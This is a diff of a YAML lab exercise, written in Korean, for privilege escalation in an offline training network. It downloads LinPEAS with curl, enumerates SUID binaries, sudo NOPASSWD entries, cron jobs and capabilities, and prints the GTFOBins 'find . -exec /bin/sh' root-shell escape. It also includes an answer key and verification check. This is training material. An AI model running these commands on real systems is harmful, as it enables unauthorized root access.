@@ -87,43 +87,88 @@ steps:
     instruction: |
       ## 🎯 MISSION
 
-      **LinPEAS 자동화** 시뮬 + GTFOBins 활용 시나리오.
+      **LinPEAS 자동화** + **GTFOBins** 활용 — 폐쇄망 환경 의 *오프라인 fallback*
+      포함.
+
+      ## ⚠️ 폐쇄망 인지 (필독)
+
+      6v6 토폴로지 의 **모든 컨테이너 가 internet 미접근** (실측 2026-05-16 — bastion +
+      attacker 모두 curl 실패, /tmp/linpeas.sh 14 byte). 실제 폐쇄망 운영 환경 의
+      *표준 제약*. 학습 = *오프라인 enum + 사전 배포* 패턴:
+
+      1. **사전 패키지 배포** — Dockerfile 또는 ansible playbook 에 LinPEAS 사전
+         pull (인프라 정정 — P22 backlog)
+      2. **GTFOBins 오프라인 cheat sheet** — `/opt/gtfobins.txt` 같은 로컬 사본
+      3. **내장 도구만 enum** — find/grep/awk + 기본 SUID 셋 (학습 환경 의 기본)
 
       ## 💻 실행 명령
 
       ```bash
-      # LinPEAS 다운로드 (실 실행은 5분+ 소요 — 시뮬)
-      ssh 6v6-bastion 'curl -sL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1 | head -3'
-      ssh 6v6-bastion 'ls -la /tmp/linpeas.sh 2>/dev/null'
+      # 1) 다운로드 시도 — 폐쇄망 확인 (14 byte = curl error msg 만 저장)
+      ssh 6v6-bastion 'curl -sL --max-time 5 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1; echo "bastion: $(wc -c < /tmp/linpeas.sh) byte"'
+      ssh 6v6-attacker 'curl -sL --max-time 5 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1; echo "attacker: $(wc -c < /tmp/linpeas.sh) byte"'
 
-      # GTFOBins 시뮬 — find SUID 가 있다면 root shell 가능
-      ssh 6v6-bastion 'ls -la /usr/bin/find /usr/bin/vim /usr/bin/awk 2>/dev/null | head -3'
-      echo "GTFOBins 활용: find . -exec /bin/sh \\; (find 가 SUID 일 때)"
+      # 2) 오프라인 enum — LinPEAS 의 핵심 5 카테고리 를 *수동 스크립트* 로 대체
+      ssh 6v6-bastion '
+        echo "[+] SUID binaries (LinPEAS RED 등급):"
+        find / -perm -4000 -type f 2>/dev/null | head -10
+        echo "[+] sudo NOPASSWD entries (LinPEAS RED):"
+        sudo -n -l 2>&1 | grep -i nopasswd | head -5
+        echo "[+] cron jobs (LinPEAS YELLOW):"
+        cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
+        echo "[+] world-writable files (LinPEAS RED):"
+        find /etc /home -perm -002 -type f 2>/dev/null | head -5
+        echo "[+] capabilities (LinPEAS YELLOW):"
+        getcap -r / 2>/dev/null | head -5
+      '
+
+      # 3) GTFOBins 의 *전제 조건* 검증 — SUID 가 있어야 우회 가능
+      ssh 6v6-bastion '
+        echo "[GTFOBins 전제] /usr/bin/find SUID?:"
+        ls -la /usr/bin/find | grep -E "rws" && echo "  → 활용 가능: find . -exec /bin/sh \;" || echo "  → SUID 없음 (정상 hardening) → GTFOBins find 우회 불가"
+        echo "[GTFOBins 전제] /usr/bin/vim sudo NOPASSWD?:"
+        sudo -n -l 2>&1 | grep -i "vim\|/usr/bin/vim" || echo "  → NOPASSWD vim 없음 → GTFOBins vim 우회 불가"
+      '
       ```
 
       ## 📋 확인 사항
 
-      - LinPEAS 다운로드 (실 실행은 별 lab)
-      - find / vim / awk 의 permission (SUID 여부)
-      - GTFOBins 명령 예시 인지
+      - 1) bastion + attacker 모두 *14 byte* — 폐쇄망 확정
+      - 2) 5 카테고리 enum 출력 (SUID 10개 + sudo + cron + writable + capabilities)
+      - 3) GTFOBins 전제 조건 *부재* — 학습 환경 hardening 의 의미
 
       ## 💡 왜 이걸 하는가?
 
-      LinPEAS 는 5 카테고리 + 100+ 점검 자동화. GTFOBins (https://gtfobins.github.io)
-      는 SUID 활용 표준 cheat sheet.
+      폐쇄망 환경 의 권한 상승 시도 는 *내장 도구 + 사전 배포 패키지 + 수동 검증*
+      의 3 축. LinPEAS / WinPEAS 가 *자동화 표준* 이지만 폐쇄망 에서는 *사전
+      배포* 가 전제. GTFOBins (https://gtfobins.github.io) 의 cheat sheet 도
+      *SUID + NOPASSWD* 가 있어야 동작 — 정상 hardening 환경 에서는 *대부분 불가*.
 
       ## 🔍 결과 해석
 
-      - **정상**: LinPEAS 다운로드 성공
-      - **권한 상승**: SUID find → `find . -exec /bin/sh \;` 로 root shell
-    hint: LinPEAS + GTFOBins
+      - **정상 (학습 환경)**: 1) 둘 다 14 byte 2) enum 결과 표준 셋 3) GTFOBins 우회
+        불가
+      - **bastion / attacker internet 가능** — 폐쇄망 정책 위반, 즉시 보고
+      - **GTFOBins 우회 가능** — 학습 환경 hardening 결함, custom SUID 등 review
+
+      ## 비정상 시 대응
+
+      - **enum 결과 모두 빈 출력** — 권한 부족 (sudo NOPASSWD 없음). `id` 로 사용자
+        확인 → ccc 가 아닌 root 로 실행 중 인지 (정상은 ccc 권한)
+      - **5 카테고리 중 일부 누락** — Alpine / minimal 이미지 (getcap / find -perm
+        지원 X). `apk add libcap-utils findutils` 검토.
+    hint: |
+      폐쇄망 = 둘 다 14 byte. LinPEAS 대체 = 수동 5 카테고리 enum. GTFOBins 의
+      전제 (SUID + NOPASSWD) 부재 = 정상 hardening.
     category: exploit
     points: 25
     answer: |
-      ssh 6v6-bastion 'curl -sL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1 | head -3'
-      ssh 6v6-bastion 'ls -la /tmp/linpeas.sh 2>/dev/null'
-      ssh 6v6-bastion 'ls -la /usr/bin/find /usr/bin/vim /usr/bin/awk 2>/dev/null | head -3'
-    answer_detail: LinPEAS 다운로드 + GTFOBins 활용 시뮬.
+      ssh 6v6-bastion 'curl -sL --max-time 5 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1; echo "bastion: $(wc -c < /tmp/linpeas.sh) byte"'
+      ssh 6v6-attacker 'curl -sL --max-time 5 https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1; echo "attacker: $(wc -c < /tmp/linpeas.sh) byte"'
+      ssh 6v6-bastion 'echo SUID:; find / -perm -4000 -type f 2>/dev/null | head -5; echo NOPASSWD:; sudo -n -l 2>&1 | grep -i nopasswd | head -3; echo cron:; cat /etc/crontab 2>/dev/null | head -5'
+    answer_detail: |
+      폐쇄망 확정 (둘 다 14 byte) + 수동 5 카테고리 enum + GTFOBins 전제 부재.
+      LinPEAS 의 자동화 vs 수동 enum 의 차이 인지.
     verify:
       type: output_contains
       expect: linpeas
